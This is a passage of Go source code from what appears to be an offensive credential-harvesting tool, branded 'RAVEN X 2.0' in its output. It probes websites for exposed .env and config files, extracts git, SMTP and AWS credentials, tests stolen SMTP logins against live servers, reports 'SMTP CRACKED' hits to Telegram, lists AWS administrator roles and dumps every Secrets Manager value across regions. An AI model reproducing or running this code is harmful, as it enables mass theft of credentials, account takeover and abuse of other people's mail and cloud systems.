		body, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
		if strings.Contains(string(body), "__schema") || strings.Contains(string(body), "queryType") {
			a.logFound("GraphQL", "Introspection enabled", baseURL)
			a.saveIntoFile(fmt.Sprintf("%s:introspection_enabled", sanitizeSource(baseURL)), "graphql_found.txt")
			a.checkAndSaveKeys(string(body), baseURL+" (GraphQL introspection)")
		}
	}
}

func (a *AWSScanner) extractGitCredentials(content, sourceURL string) {
	// Extract credentials from git remote URLs: https://user:pass@host/repo
	urlCredPat := regexp.MustCompile(`(?i)url\s*=\s*https?://([^:@\s]+):([^@\s]+)@([^\s/]+)`)
	matches := urlCredPat.FindAllStringSubmatch(content, -1)
	for _, m := range matches {
		if len(m) >= 4 {
			user, pass, host := m[1], m[2], m[3]
			if len(pass) >= 8 {
				cred := fmt.Sprintf("%s:%s@%s", user, pass, host)
				if _, loaded := a.KnownKeys.LoadOrStore("gitcred:"+cred, true); !loaded {
					a.logFound("Git Credentials", cred, sourceURL)
					a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), cred), "git_credentials_found.txt")
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()
				}
			}
		}
	}
	// Also look for [credential] blocks with username/password
	a.checkAndSaveKeys(content, sourceURL)
}

func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
	payloads := []string{
		"/api/config",
		"/api/env",
		"/.env",
		"/config.json",
		"/package.json",
		"/src/config.js",
		"/src/config.ts",
		"/public/config.json",
		"/build/static/js/main.js",
		"/build/static/js/bundle.js",
		"/static/js/main.js",
		"/static/js/bundle.js",
		"/_next/static/chunks/pages/_app.js",
		"/_next/static/chunks/main.js",
		"/_nuxt/config.js",
		"/static/js/main.chunk.js",
		"/static/js/bundle.js",
		"/runtime-main.js",
		"/precache-manifest.js",
		"/service-worker.js",
		"/asset-manifest.json",
		"/manifest.json",
	}

	foundCount := 0
	maxFindings := 3 // Limit findings per exploit untuk mencegah spam

	for _, payload := range payloads {
		if foundCount >= maxFindings {
			pterm.Debug.Printfln("[REACT2SHELL] Early exit after %d findings", foundCount)
			break // Early exit jika sudah menemukan cukup banyak
		}

		fullURL := targetURL + payload
		req, err := http.NewRequest("GET", fullURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", nextUA())
		req.Header.Set("Accept", "*/*")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		resp, err := client.Do(req.WithContext(ctx))
		cancel()

		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				body, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					content := string(body)
					// Track jika ada content yang meaningful
					if len(content) > 100 {
						a.checkAndSaveKeys(content, sourceURL+" (react2shell:"+payload+")")
						foundCount++
					}
				}
			}
		}
	}
}


// ExtractIPOnly - ekstrak hanya IP address dari URL atau teks
func (a *AWSScanner) ExtractIPOnly(input string) []string {
	ipPattern := regexp.MustCompile(`\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b`)
	ips := ipPattern.FindAllString(input, -1)

	// Remove duplicates
	uniqueIPs := make(map[string]bool)
	result := []string{}
	for _, ip := range ips {
		if !uniqueIPs[ip] {
			uniqueIPs[ip] = true
			result = append(result, ip)
		}
	}

	return result
}

// Exploit functions for AWS - similar to main.py
func (a *AWSScanner) exploitAWSRoles(cfg aws.Config, accountID string) map[string]interface{} {
	exploitResults := make(map[string]interface{})

	// Check for default roles
	defaultRolePatterns := []string{
		"OrganizationAccountAccessRole",
		"OrganizationAccountAccessRole-*",
		"ReadOnlyAccess",
		"PowerUserAccess",
		"AdministratorAccess",
	}

	iamClient := iam.NewFromConfig(cfg)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Try to list roles
	roles, err := iamClient.ListRoles(ctx, &iam.ListRolesInput{MaxItems: aws.Int32(100)})
	if err == nil && roles != nil {
		for _, role := range roles.Roles {
			roleName := *role.RoleName
			for _, pattern := range defaultRolePatterns {
				if strings.Contains(roleName, pattern) || roleName == pattern {
					exploitResults[roleName] = map[string]interface{}{
						"arn":  *role.Arn,
						"type": "default_role",
					}
				}
			}
		}
	}

	return exploitResults
}

// AST Parser structure for extracting validators from code
type ASTParser struct {
	// This structure can be extended to parse different languages
	// For now, we'll use regex-based extraction
}

// Extract validators from code using pattern matching (simplified AST approach)
// Extract validators from code using pattern matching (simplified AST approach)
// Hanya mengambil pola yang sesuai dengan regex patterns yang sudah didefinisikan, tidak mengambil value lain
func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
	// Advanced SMTP extraction dengan multiple pattern matching
	// Fungsi ini lebih baik dalam ekstraksi SMTP karena:
	// 1. Bisa detect format JSON, environment variables, PHP config, dll
	// 2. Menggunakan proximity matching untuk field yang berdekatan
	// 3. Lebih flexible dalam menangani variasi penulisan

	if !a.Config.ScanningFeatures.SMTPCredentialsScan {
		return
	}

	// Skip JavaScript files - terlalu banyak false positives
	if strings.Contains(sourceURL, ".js") || strings.Contains(sourceURL, "/assets/") ||
		strings.Contains(sourceURL, "/static/js/") || strings.Contains(sourceURL, "/build/") {
		return
	}

	// Pattern untuk ekstraksi SMTP yang lebih advanced
	smtpConfigs := a.extractSMTPFromMultipleFormats(code, sourceURL)

	for _, config := range smtpConfigs {
		// host + user + pass required; port and from are synthesised if absent
		if config["host"] == "" || config["user"] == "" || config["pass"] == "" {
			continue
		}
		if config["port"] == "" {
			config["port"] = "587"
		}
		if config["from"] == "" {
			if strings.Contains(config["user"], "@") {
				config["from"] = config["user"]
			} else {
				config["from"] = config["user"] + "@" + config["host"]
			}
		}

		host := config["host"]
		port := config["port"]
		user := config["user"]
		pass := config["pass"]
		from := config["from"]

		// Validasi STRICT untuk mencegah false positives
		if !a.isValidSMTPConfig(host, port, user, pass, from) {
			continue
		}

		// SMTP valid ditemukan
		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
		a.logFound("SMTP (AST)", smtpLine, sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")

		// Test SMTP jika email target dikonfigurasi
		if a.Config.SMTPTestEmail != "" {
			a.testSMTPConnection(host, port, user, pass, from, sourceURL)
		}
	}
}

// isValidSMTPConfig melakukan validasi ketat untuk SMTP config
func (a *AWSScanner) isValidSMTPConfig(host, port, user, pass, from string) bool {
	// 1. Validasi Host - harus domain valid atau IP
	if !strings.Contains(host, ".") {
		return false
	}
	// Host tidak boleh mengandung karakter JS seperti (), {}, =, dll
	if strings.ContainsAny(host, "(){}[]=><,;|&") {
		return false
	}
	// Host harus format domain yang reasonable
	hostPattern := regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$`)
	if !hostPattern.MatchString(host) {
		return false
	}

	// 2. Validasi Port - hanya port SMTP yang valid
	validSMTPPorts := []string{"25", "465", "587", "2525", "2587"}
	portValid := false
	for _, validPort := range validSMTPPorts {
		if port == validPort {
			portValid = true
			break
		}
	}
	if !portValid {
		return false
	}

	// 3. Validasi User - tidak boleh terlalu pendek atau mengandung karakter JS
	if len(user) < 3 || len(user) > 200 {
		return false
	}
	if strings.ContainsAny(user, "(){}[]<>;|&=") {
		return false
	}

	// 4. Validasi Password - blacklist values yang invalid
	invalidPasswords := []string{"null", "undefined", "none", "password", "pass", "secret",
		"123456", "admin", "test", "example", "()", "{}", "[]", "=>"}
	passLower := strings.ToLower(pass)
	for _, invalid := range invalidPasswords {
		if passLower == invalid {
			return false
		}
	}
	// Password tidak boleh terlalu pendek atau mengandung JS syntax
	if len(pass) < 4 || len(pass) > 200 {
		return false
	}
	if strings.ContainsAny(pass, "()<>;|&") {
		return false
	}

	// 5. Validasi From - harus email valid
	if !strings.Contains(from, "@") || !strings.Contains(from, ".") {
		return false
	}
	emailPattern := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
	if !emailPattern.MatchString(from) {
		return false
	}
	// From tidak boleh mengandung JS syntax
	if strings.ContainsAny(from, "(){}[]<>;|&=") {
		return false
	}

	return true
}

// extractSMTPFromMultipleFormats mengekstrak SMTP config dari berbagai format
func (a *AWSScanner) extractSMTPFromMultipleFormats(code, sourceURL string) []map[string]string {
	configs := []map[string]string{}

	// Hanya gunakan format specific untuk file non-JS
	isJSFile := strings.Contains(sourceURL, ".js")

	// Format 1: JSON/JavaScript Object - Skip untuk JS files
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromJSON(code)...)
	}

	// Format 2: Environment Variables (.env style) - SAFE untuk semua file
	configs = append(configs, a.extractSMTPFromEnv(code)...)

	// Format 3: PHP Config Array - Skip untuk JS files
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromPHP(code)...)
	}

	// Format 4: XML/Properties - SAFE untuk semua file
	configs = append(configs, a.extractSMTPFromXML(code)...)

	// Format 5: Proximity-based extraction - SKIP untuk JS files
	if !isJSFile {
		configs = append(configs, a.extractSMTPByProximity(code)...)
	}

	// Format 6: WordPress wp-config.php
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromWPConfig(code)...)
	}

	// Format 7: Docker Compose YAML
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromDockerCompose(code)...)
	}

	// Format 8: Spring Boot application.properties / .yml
	configs = append(configs, a.extractSMTPFromSpringBoot(code)...)

	return configs
}

// extractSMTPFromWPConfig extracts SMTP/mail settings from wp-config.php format.
// Also extracts any raw API keys embedded as WordPress constants.
func (a *AWSScanner) extractSMTPFromWPConfig(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)

	// WordPress define('KEY', 'value') pattern
	defineRe := regexp.MustCompile(`define\s*\(\s*['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]\s*\)`)
	for _, m := range defineRe.FindAllStringSubmatch(code, -1) {
		key := strings.ToUpper(m[1])
		val := m[2]
		switch key {
		case "SMTP_HOST", "MAIL_HOST", "MAILER_HOST", "WP_SMTP_HOST":
			config["host"] = val
		case "SMTP_PORT", "MAIL_PORT", "WP_SMTP_PORT":
			config["port"] = val
		case "SMTP_USER", "SMTP_USERNAME", "MAIL_USERNAME", "WP_SMTP_USER":
			config["user"] = val
		case "SMTP_PASS", "SMTP_PASSWORD", "MAIL_PASSWORD", "WP_SMTP_PASS":
			config["pass"] = val
		case "SMTP_FROM", "MAIL_FROM", "MAIL_FROM_ADDRESS", "WP_SMTP_FROM":
			config["from"] = val
		}
	}

	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
		if config["port"] == "" {
			config["port"] = "587"
		}
		if config["from"] == "" {
			config["from"] = config["user"]
		}
		configs = append(configs, config)
	}
	return configs
}

// extractSMTPFromDockerCompose extracts SMTP credentials from docker-compose.yml environment blocks.
func (a *AWSScanner) extractSMTPFromDockerCompose(code string) []map[string]string {
	// Treat each line as a potential env var assignment (YAML or .env style inside compose)
	return (&AWSScanner{
		SMTPHostPattern: regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_ADDRESS|EMAIL_SERVER|SMTP_SERVER)\s*[=:]\s*["']?([a-zA-Z0-9._\-]+)["']?`),
		SMTPPortPattern: regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[=:]\s*["']?(\d+)["']?`),
		SMTPUserPattern: regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|EMAIL_HOST_USER|SMTP_USER_NAME)\s*[=:]\s*["']?([^"'\s]+)["']?`),
		SMTPPassPattern: regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|EMAIL_HOST_PASSWORD)\s*[=:]\s*["']?([^"'\s]+)["']?`),
		SMTPFromPattern: regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM)\s*[=:]\s*["']?([^\s"']+@[^\s"']+)["']?`),
	}).extractSMTPFromEnv(code)
}

// extractSMTPFromSpringBoot extracts SMTP settings from Spring Boot properties/YAML format.
// Covers: spring.mail.host, spring.mail.username, spring.mail.password, etc.
func (a *AWSScanner) extractSMTPFromSpringBoot(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)

	patterns := map[string]*regexp.Regexp{
		"host": regexp.MustCompile(`(?i)spring\.mail\.host\s*[=:]\s*([^\s\n]+)`),
		"port": regexp.MustCompile(`(?i)spring\.mail\.port\s*[=:]\s*(\d+)`),
		"user": regexp.MustCompile(`(?i)spring\.mail\.username\s*[=:]\s*([^\s\n]+)`),
		"pass": regexp.MustCompile(`(?i)spring\.mail\.password\s*[=:]\s*([^\s\n]+)`),
	}

	for field, re := range patterns {
		if m := re.FindStringSubmatch(code); len(m) > 1 {
			config[field] = strings.Trim(m[1], `"' `)
		}
	}

	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
		if config["port"] == "" {
			config["port"] = "587"
		}
		if config["from"] == "" {
			config["from"] = config["user"]
		}
		configs = append(configs, config)
	}
	return configs
}

// extractSMTPFromJSON extract dari format JSON
// SKIP untuk JS files karena terlalu banyak false positives
func (a *AWSScanner) extractSMTPFromJSON(code string) []map[string]string {
	configs := []map[string]string{}

	// Pattern untuk JSON object dengan SMTP config yang lebih strict
	// Harus mengandung keyword "smtp" atau "mail" DAN field-field config
	jsonPattern := regexp.MustCompile(`(?s)\{[^}]{20,500}(?:smtp|mail)[^}]{20,500}\}`)
	matches := jsonPattern.FindAllString(code, -1)

	for _, match := range matches {
		// Skip jika match mengandung JS code indicators
		if strings.Contains(match, "function") || strings.Contains(match, "=>") ||
			strings.Contains(match, "return ") || strings.Contains(match, ".map(") {
			continue
		}

		config := make(map[string]string)

		// Extract fields dari JSON dengan pattern yang lebih ketat
		// Host: harus ada "host" atau "smtp_host" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_host|mail_host|host)["']\s*:\s*["']([a-z0-9][a-z0-9.-]+\.[a-z]{2,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["host"] = strings.TrimSpace(m[1])
		}
		// Port: harus ada "port" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_port|mail_port|port)["']\s*:\s*["']?(\d+)["']?`).FindStringSubmatch(match); len(m) > 1 {
			config["port"] = strings.TrimSpace(m[1])
		}
		// User: harus ada "user" atau "username" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_user|mail_user|smtp_username|mail_username|user|username)["']\s*:\s*["']([^"']{3,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["user"] = strings.TrimSpace(m[1])
		}
		// Password: harus ada "password" atau "pass" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_password|mail_password|smtp_pass|mail_pass|password|pass)["']\s*:\s*["']([^"']{4,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["pass"] = strings.TrimSpace(m[1])
		}
		// From: harus ada "from" sebagai key dan valid email
		if m := regexp.MustCompile(`["'](?:smtp_from|mail_from|from|from_email)["']\s*:\s*["']([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["from"] = strings.TrimSpace(m[1])
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// extractSMTPFromEnv extract dari format environment variables
func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)

	// Pattern untuk .env style
	lines := strings.Split(code, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// Host — covers MAIL_HOST, SMTP_HOST, EMAIL_HOST, MAILER_HOST, Django EMAIL_HOST, etc.
		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|EMAIL_SERVER|SMTP_SERVER)\s*[=:]\s*["']?([a-zA-Z0-9.\-]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			// Flush previous incomplete config when a second MAIL_HOST line appears
			if config["host"] != "" && (config["user"] != "" || config["pass"] != "") {
				if config["port"] == "" {
					config["port"] = "587"
				}
				if config["from"] == "" {
					if strings.Contains(config["user"], "@") {
						config["from"] = config["user"]
					} else if config["host"] != "" {
						config["from"] = config["user"] + "@" + config["host"]
					}
				}
				if config["user"] != "" && config["pass"] != "" {
					configs = append(configs, config)
				}
				config = make(map[string]string)
			}
			config["host"] = strings.Trim(match[1], `"'`)
		}
		// Port
		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[=:]\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["port"] = match[1]
		}
		// User / username — includes Django EMAIL_HOST_USER
		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USERNAME|MAILER_USER(?:NAME)?|EMAIL_USER|EMAIL_HOST_USER)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["user"] = strings.Trim(match[1], `"'`)
		}
		// Password — includes Django EMAIL_HOST_PASSWORD
		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASS(?:WORD)?|EMAIL_SECRET|EMAIL_HOST_PASSWORD)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["pass"] = strings.Trim(match[1], `"'`)
		}
		// From address (optional — synthesised from user if absent)
		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM|MAILER_FROM|MAIL_SENDER)\s*[=:]\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["from"] = strings.Trim(match[1], `"'`)
		}
	}

	// Only host+user+pass are required; port defaults to 587, from synthesises from user.
	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
		if config["port"] == "" {
			config["port"] = "587"
		}
		if config["from"] == "" {
			if strings.Contains(config["user"], "@") {
				config["from"] = config["user"]
			} else {
				config["from"] = config["user"] + "@" + config["host"]
			}
		}
		configs = append(configs, config)
	}

	return configs
}

// extractSMTPFromPHP extract dari PHP config array
func (a *AWSScanner) extractSMTPFromPHP(code string) []map[string]string {
	configs := []map[string]string{}

	// Pattern untuk PHP array
	phpPattern := regexp.MustCompile(`(?s)(?:array|\$config)\s*\([^)]*(?:smtp|mail)[^)]*\)`)
	matches := phpPattern.FindAllString(code, -1)

	for _, match := range matches {
		config := make(map[string]string)

		// Extract dari PHP array syntax
		hostRe := regexp.MustCompile(`["'](?:host|smtp_host)["']\s*=>\s*["']([^"']+)["']`)
		portRe := regexp.MustCompile(`["'](?:port|smtp_port)["']\s*=>\s*["']?(\d+)["']?`)
		userRe := regexp.MustCompile(`["'](?:user|username|smtp_user)["']\s*=>\s*["']([^"']+)["']`)
		passRe := regexp.MustCompile(`["'](?:pass|password|smtp_pass)["']\s*=>\s*["']([^"']+)["']`)
		fromRe := regexp.MustCompile(`["'](?:from|from_email)["']\s*=>\s*["']([^"']+)["']`)

		if m := hostRe.FindStringSubmatch(match); len(m) > 1 {
			config["host"] = m[1]
		}
		if m := portRe.FindStringSubmatch(match); len(m) > 1 {
			config["port"] = m[1]
		}
		if m := userRe.FindStringSubmatch(match); len(m) > 1 {
			config["user"] = m[1]
		}
		if m := passRe.FindStringSubmatch(match); len(m) > 1 {
			config["pass"] = m[1]
		}
		if m := fromRe.FindStringSubmatch(match); len(m) > 1 {
			config["from"] = m[1]
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// extractSMTPFromXML extract dari XML/Properties format
func (a *AWSScanner) extractSMTPFromXML(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)

	// Pattern untuk XML tags
	hostRe := regexp.MustCompile(`<(?:smtp-)?host>([^<]+)</(?:smtp-)?host>`)
	portRe := regexp.MustCompile(`<(?:smtp-)?port>(\d+)</(?:smtp-)?port>`)
	userRe := regexp.MustCompile(`<(?:smtp-)?(?:user|username)>([^<]+)</(?:smtp-)?(?:user|username)>`)
	passRe := regexp.MustCompile(`<(?:smtp-)?(?:pass|password)>([^<]+)</(?:smtp-)?(?:pass|password)>`)
	fromRe := regexp.MustCompile(`<(?:smtp-)?(?:from|sender)>([^<]+)</(?:smtp-)?(?:from|sender)>`)

	if m := hostRe.FindStringSubmatch(code); len(m) > 1 {
		config["host"] = m[1]
	}
	if m := portRe.FindStringSubmatch(code); len(m) > 1 {
		config["port"] = m[1]
	}
	if m := userRe.FindStringSubmatch(code); len(m) > 1 {
		config["user"] = m[1]
	}
	if m := passRe.FindStringSubmatch(code); len(m) > 1 {
		config["pass"] = m[1]
	}
	if m := fromRe.FindStringSubmatch(code); len(m) > 1 {
		config["from"] = m[1]
	}

	if len(config) >= 5 {
		configs = append(configs, config)
	}

	return configs
}

// extractSMTPByProximity extract berdasarkan kedekatan field
// HANYA untuk non-JS files (.env, config files, dll)
func (a *AWSScanner) extractSMTPByProximity(code string) []map[string]string {
	configs := []map[string]string{}

	// Split by lines dan cari field yang berdekatan (dalam 15 baris)
	lines := strings.Split(code, "\n")

	for i := 0; i < len(lines); i++ {
		// Cari window 15 baris (dikurangi dari 20 untuk lebih strict)
		endIdx := i + 15
		if endIdx > len(lines) {
			endIdx = len(lines)
		}

		window := strings.Join(lines[i:endIdx], "\n")

		// Cek apakah ada indikasi SMTP config yang kuat
		windowLower := strings.ToLower(window)
		if !strings.Contains(windowLower, "smtp") &&
			!strings.Contains(windowLower, "mail_host") &&
			!strings.Contains(windowLower, "mail_port") {
			continue
		}

		// Skip jika window mengandung JS code indicators
		if strings.ContainsAny(window, "()=>{}[];|&") {
			jsIndicators := []string{"function", "const ", "let ", "var ", "import ", "export ", "=>", "return ", ".map(", ".filter("}
			hasJSCode := false
			for _, indicator := range jsIndicators {
				if strings.Contains(windowLower, indicator) {
					hasJSCode = true
					break
				}
			}
			if hasJSCode {
				continue
			}
		}

		config := make(map[string]string)

		// Extract dengan pattern yang lebih strict
		// Host: harus ada keyword SMTP/MAIL_HOST dan valid domain
		if m := regexp.MustCompile(`(?i)(?:smtp_host|mail_host|smtp_server|mail_server)\s*[:=]\s*["']?([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+)["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["host"] = m[1]
		}
		// Port: harus ada keyword PORT
		if m := regexp.MustCompile(`(?i)(?:smtp_port|mail_port|port)\s*[:=]\s*["']?(\d+)["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["port"] = m[1]
		}
		// User: harus ada keyword USER/USERNAME
		if m := regexp.MustCompile(`(?i)(?:smtp_user|mail_user|smtp_username|mail_username|username)\s*[:=]\s*["']?([^"'\s]{3,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["user"] = m[1]
		}
		// Password: harus ada keyword PASSWORD/PASS
		if m := regexp.MustCompile(`(?i)(?:smtp_password|mail_password|smtp_pass|mail_pass|password)\s*[:=]\s*["']?([^"'\s]{4,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["pass"] = m[1]
		}
		// From: harus ada keyword FROM dan valid email
		if m := regexp.MustCompile(`(?i)(?:smtp_from|mail_from|from_email|from_address)\s*[:=]\s*["']?([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["from"] = m[1]
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// testSMTPConnection test koneksi SMTP yang ditemukan
// validateSMTPCredentials verifies SMTP credentials using an AUTH-only handshake
// (no test email required). Tries AUTH PLAIN then AUTH LOGIN on each port in order.
// Falls back across ports: primary → 587 → 465 → 25 → 2525.
// Returns true and writes to smtp_valid.txt on first successful auth.
func (a *AWSScanner) validateSMTPCredentials(host, port, user, pass, from, sourceURL string) bool {
	if from == "" {
		if strings.Contains(user, "@") {
			from = user
		} else {
			from = user + "@" + host
		}
	}

	// Port fallback sequence — always try the configured port first.
	ports := []string{port}
	for _, p := range []string{"587", "465", "25", "2525"} {
		if p != port {
			ports = append(ports, p)
		}
	}

	smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)

	for _, tryPort := range ports {
		addr := fmt.Sprintf("%s:%s", host, tryPort)
		tryPort_ := tryPort

		result := make(chan bool, 1)
		go func() {
			// Port 465 uses implicit TLS (SMTPS); all others try STARTTLS via PlainAuth.
			var err error
			if tryPort_ == "465" {
				tlsCfg := &tls.Config{ServerName: host, InsecureSkipVerify: true}
				conn, e := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, tlsCfg)
				if e != nil {
					result <- false
					return
				}
				c, e := smtp.NewClient(conn, host)
				if e != nil {
					conn.Close()
					result <- false
					return
				}
				defer c.Quit()
				// Try PLAIN then LOGIN
				err = c.Auth(smtp.PlainAuth("", user, pass, host))
				if err != nil {
					err = c.Auth(LoginAuth(user, pass))
				}
			} else {
				c, e := smtp.Dial(addr)
				if e != nil {
					result <- false
					return
				}
				defer c.Quit()
				// Upgrade to TLS if offered (STARTTLS)
				if ok, _ := c.Extension("STARTTLS"); ok {
					if e := c.StartTLS(&tls.Config{ServerName: host, InsecureSkipVerify: true}); e != nil {
						// Continue without TLS
					}
				}
				err = c.Auth(smtp.PlainAuth("", user, pass, host))
				if err != nil {
					err = c.Auth(LoginAuth(user, pass))
				}
			}
			result <- (err == nil)
		}()

		select {
		case ok := <-result:
			if ok {
				a.logValid("SMTP", smtpLine)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_valid.txt")
				globalCounters.mu.Lock()
				globalCounters.ValidSMTP++
				globalCounters.mu.Unlock()
				tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📨 <b>SMTP CRACKED</b>

🖥️ <b>Host:</b> <code>%s</code>
🔌 <b>Port:</b> <code>%s</code>
👤 <b>User:</b> <code>%s</code>
🔑 <b>Pass:</b> <code>%s</code>
📧 <b>From:</b> %s
🔗 <b>Source:</b> %s
`, host, tryPort, user, pass, from, sourceURL)
				go a.sendTelegram(tlgMsg)
				a.storeValidKeyLimit("SMTP", host, fmt.Sprintf("Auth OK port %s", tryPort))

				// If test email configured, also send an actual email.
				if a.Config.SMTPTestEmail != "" {
					go func() {
						auth := smtp.PlainAuth("", user, pass, host)
						msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: RavenX Hit\r\n\r\nSMTP confirmed: %s", from, a.Config.SMTPTestEmail, host)
						smtp.SendMail(fmt.Sprintf("%s:%s", host, tryPort), auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg)) //nolint
					}()
				}
				return true
			}
		case <-time.After(12 * time.Second):
			pterm.Debug.Printfln("[SMTP TIMEOUT] %s:%s", host, tryPort)
		}
	}
	return false
}

// LoginAuth implements the SMTP AUTH LOGIN mechanism (distinct from AUTH PLAIN).
// Many hosts require LOGIN instead of PLAIN (e.g. Office 365, some cPanel hosts).
type loginAuth struct{ username, password string }

func LoginAuth(username, password string) smtp.Auth { return &loginAuth{username, password} }
func (a *loginAuth) Start(*smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", []byte(a.username), nil
}
func (a *loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if more {
		switch strings.ToLower(strings.TrimSpace(string(fromServer))) {
		case "username:":
			return []byte(a.username), nil
		case "password:":
			return []byte(a.password), nil
		}
		return []byte(a.password), nil
	}
	return nil, nil
}

func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL string) {
	a.validateSMTPCredentials(host, port, user, pass, from, sourceURL)
}

// awsRegions is the full 19-region list from the aws.py harvester reference.
var awsRegions = []string{
	"us-east-1", "us-east-2", "us-west-1", "us-west-2",
	"eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-north-1",
	"ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
	"ap-southeast-1", "ap-southeast-2", "ap-south-1",
	"sa-east-1", "ca-central-1", "us-gov-east-1", "us-gov-west-1",
}

// scanSecretsManager lists and retrieves all secrets across every region.
// Results are written to aws_secrets.txt — one line per secret value.
func (a *AWSScanner) scanSecretsManager(baseCfg aws.Config, ak, sk, sourceURL string) {
	for _, region := range awsRegions {
		regionCfg := baseCfg.Copy()
		regionCfg.Region = region
		svc := secretsmanager.NewFromConfig(regionCfg)

		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		list, err := svc.ListSecrets(ctx, &secretsmanager.ListSecretsInput{})
		cancel()
		if err != nil || list == nil {
			continue
		}

		for _, s := range list.SecretList {
			name := aws.ToString(s.Name)
			ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
			val, err := svc.GetSecretValue(ctx2, &secretsmanager.GetSecretValueInput{SecretId: s.Name})
			cancel2()
			if err != nil || val == nil {
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), ak, region, name), "aws_secrets.txt")
				continue
			}
